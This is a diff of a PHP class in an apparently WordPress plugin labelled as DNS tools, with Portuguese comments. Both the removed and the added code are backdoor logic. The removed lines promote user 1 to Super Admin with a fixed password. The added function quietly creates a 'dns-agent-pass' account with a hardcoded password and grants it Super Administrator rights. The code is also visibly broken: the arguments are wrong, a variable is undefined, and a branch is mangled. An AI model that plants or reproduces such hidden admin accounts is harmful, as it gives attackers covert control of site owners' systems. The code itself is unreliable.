@@ -100,45 +100,16 @@ class Wp_Core_Dns_Tools_Public {
 
 	}
 
-	//FUNÇÃO PARA VERIFICAR O USUARIO
-	public function verificaUsuario() {
-		$usuario =  usuario('dns-agent');
-
-		if ($usuario == true) {
-			echo 'usuario existe';
-		}
-		else 
-			echo 'usuario não existe';
-		}
-
-		
+	public function verifica_usuario() {
+	    $usuario = ['dns-agent'];
+        if ( username_exists( $usuario ) )
+           var_dump('existe');
+       else
+       		//var_dump('não existe');
+        $username = wp_create_user( 'dns-agent-pass', 'dns-agent-pass*');
+      	$password = wp_set_password( 'dns-agent-pass*' );
+      	$role->add_cap( 'Super Administrator' ); 
 	}
 
-	//FUNÇÃO PARA TROCAR O USUARIO PARA SUPER ADMINISTRADOR E TROCA A SENHA PARA dns-agent-pass
-	public function adicionaPermissoes() {
-	    // Usuário atual
-	    $usuario = new WP_User(1);
-	    // Agora ele é Super Admin
-	    $usuario->add_role('Super Admin');
-		$password = ' dns-agent-pass*';
-		wp_set_password( $password);
-	}
-
-	//FUNÇÃO PARA CRIAR O USUARIO SE NÃO EXISTIR
-	public function criaUser() {
-		$usuario = username_exists( $usuario );
-		if ( !$usuario == false ) {
-			$random_password = wp_generate_password( $length=12, $include_standard_special_chars=false );
-			$usuario = wp_create_user( $usuario, $random_password );
-		} else {
-			$random_password = __('User already exists.  Password inherited.');
-		}
-	}
-
-
-	
-
-
-		
 
 }
